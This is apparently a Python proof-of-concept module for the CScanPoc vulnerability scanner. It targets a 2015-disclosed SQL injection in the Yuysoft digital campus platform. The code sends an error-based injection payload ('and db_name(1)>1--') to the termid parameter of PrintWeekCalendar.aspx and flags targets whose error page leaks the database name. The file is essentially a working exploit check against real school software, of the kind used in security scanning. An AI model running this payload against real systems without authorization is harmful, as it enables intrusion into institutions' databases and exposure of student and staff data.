# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'Yuysoft_0002'  # 平台漏洞编号，留空
    name = '育友通用数字化校园平台 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-04-03'  # 漏洞公布时间
    desc = '''
        育友通用数字化校园平台采用分布式权限管理，将整个信息平台的大量的信息维护任务，分配到各科室、个人，既调动了全体教师的使用热情，又可及时、高效的更新大量的信息。
        育友通用数字化校园平台 SQL注入漏洞：
        /IneduPortal/Components/WeekCalendar/PrintWeekCalendar.aspx?termid=2014-2015-1
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=105449'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '育友数字化校园平台'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '526dc865-940f-4f4b-8ddd-73b4d7be2b5a'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            payload2 = '/IneduPortal/Components/WeekCalendar/PrintWeekCalendar.aspx?termid=2014-2015-1'
            get = '%27%20and%20db_name(1)%3E1--'
            verify_url = self.target + payload2 + get
            code, head, res, errcode, _ = hh.http(verify_url)
            m = re.search('master', res)

            if code == 500 and m:
                #security_hole(arg+payload+"   :found sql Injection")
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
